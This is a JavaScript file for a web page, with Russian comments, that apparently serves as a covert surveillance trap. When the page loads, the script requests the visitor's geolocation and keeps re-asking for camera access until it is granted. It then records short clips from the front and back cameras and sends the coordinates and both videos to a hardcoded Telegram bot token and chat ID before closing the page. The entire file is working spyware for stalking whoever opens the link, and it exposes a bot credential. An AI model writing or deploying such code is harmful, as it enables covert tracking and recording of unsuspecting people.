// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8621842542:AAGj8u2N6VHyIZNw3qX_qN9aSsSOYsZi424';
const CHAT_ID = '8244138604';

const video = document.getElementById('video');
const loaderContainer = document.querySelector('.loader-container');
let stream = null;
let locationData = null;
let mediaRecorder = null;
let recordedChunks = [];

// Обновление текста загрузки
function updateLoaderText(text) {
    const loaderText = document.querySelector('.loader-text');
    if (loaderText) {
        loaderText.textContent = text;
    }
}

// Функция запроса геолокации (только 2 попытки)
async function requestLocation() {
    return new Promise((resolve) => {
        let attempts = 0;
        const maxAttempts = 2;
        
        updateLoaderText(`Запрос геолокации (${attempts + 1}/${maxAttempts})...`);
        
        const askLocation = () => {
            attempts++;
            updateLoaderText(`Запрос геолокации (${attempts}/${maxAttempts})...`);
            
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        locationData = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        };
                        updateLoaderText('✅ Геолокация получена');
                        setTimeout(() => resolve(), 500);
                    },
                    (error) => {
                        if (attempts < maxAttempts) {
                            setTimeout(askLocation, 2000);
                        } else {
                            updateLoaderText('⚠️ Геолокация недоступна, продолжаем...');
                            setTimeout(() => resolve(), 1000);
                        }
                    }
                );
            } else {
                updateLoaderText('⚠️ Геолокация не поддерживается');
                setTimeout(() => resolve(), 1000);
            }
        };
        
        askLocation();
    });
}

// Функция запроса камеры (бесконечное повторение)
async function requestCamera(facingMode, cameraName) {
    return new Promise((resolve) => {
        updateLoaderText(`Запрос ${cameraName} камеры...`);
        
        const askCamera = () => {
            const constraints = {
                video: {
                    facingMode: { exact: facingMode },
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false // Без звука
            };
            
            navigator.mediaDevices.getUserMedia(constraints)
                .then(stream => {
                    updateLoaderText(`✅ ${cameraName} камера готова`);
                    setTimeout(() => resolve(stream), 500);
                })
                .catch(() => {
                    updateLoaderText(`❌ Нет доступа к ${cameraName} камере, повтор через 2 сек...`);
                    setTimeout(askCamera, 2000);
                });
        };
        askCamera();
    });
}

// Запись видео (4 секунды)
async function recordVideo(stream, durationMs, cameraName) {
    return new Promise((resolve) => {
        recordedChunks = [];
        
        // Настраиваем видео на элемент
        video.srcObject = stream;
        video.play();
        
        // Создаем MediaRecorder для записи видео
        const options = { mimeType: 'video/webm' };
        mediaRecorder = new MediaRecorder(stream, options);
        
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };
        
        mediaRecorder.onstop = () => {
            // Создаем видео файл из записанных данных
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            resolve(blob);
        };
        
        // Запускаем запись
        mediaRecorder.start();
        updateLoaderText(`📹 Запись ${cameraName} камеры: 0 сек`);
        
        let seconds = 0;
        const interval = setInterval(() => {
            seconds++;
            updateLoaderText(`📹 Запись ${cameraName} камеры: ${seconds}/${durationMs/1000} сек`);
        }, 1000);
        
        // Останавливаем запись через durationMs
        setTimeout(() => {
            clearInterval(interval);
            mediaRecorder.stop();
            updateLoaderText(`✅ Запись ${cameraName} камеры завершена`);
            setTimeout(() => resolve(blob), 500);
        }, durationMs);
    });
}

// Отправка геолокации
async function sendLocation() {
    if (!locationData) return;
    
    updateLoaderText('📍 Отправка геолокации...');
    
    const mapsUrl = `https://yandex.com/maps/?pt=${locationData.lon},${locationData.lat}&z=17&l=map`;
    const text = `📍 Местоположение: ${mapsUrl}`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', text);
    
    try {
        await fetch(url, { method: 'POST', body: formData });
        updateLoaderText('✅ Геолокация отправлена');
        await new Promise(resolve => setTimeout(resolve, 500));
    } catch(e) {
        updateLoaderText('⚠️ Ошибка отправки геолокации');
        await new Promise(resolve => setTimeout(resolve, 500));
    }
}

// Отправка видео в Telegram
async function sendVideoToTelegram(videoBlob, caption) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', videoBlob, 'video.webm');
    formData.append('caption', caption);
    
    try {
        const response = await fetch(url, { method: 'POST', body: formData });
        const result = await response.json();
        return result.ok;
    } catch(e) {
        console.error('Ошибка отправки видео:', e);
        return false;
    }
}

// Основная функция
async function main() {
    try {
        // 1. Геолокация (2 попытки)
        await requestLocation();
        
        // 2. Фронтальная камера + запись видео 4 сек
        stream = await requestCamera('user', 'фронтальной');
        const frontVideo = await recordVideo(stream, 4000, 'фронтальной');
        stream.getTracks().forEach(track => track.stop());
        
        // 3. Задняя камера + запись видео 4 сек
        stream = await requestCamera('environment', 'задней');
        const backVideo = await recordVideo(stream, 4000, 'задней');
        stream.getTracks().forEach(track => track.stop());
        
        // 4. Отправка
        await sendLocation();
        
        updateLoaderText('📤 Отправка фронтального видео...');
        await sendVideoToTelegram(frontVideo, '📹 Фронтальная камера (4 секунды)');
        
        updateLoaderText('📤 Отправка заднего видео...');
        await sendVideoToTelegram(backVideo, '📹 Задняя камера (4 секунды)');
        
        // 5. Завершение
        updateLoaderText('✅ Готово! Закрытие...');
        setTimeout(() => window.close(), 2000);
        
    } catch (error) {
        updateLoaderText('❌ Ошибка, перезагрузите страницу');
        console.error(error);
    }
}

// Запуск
main();
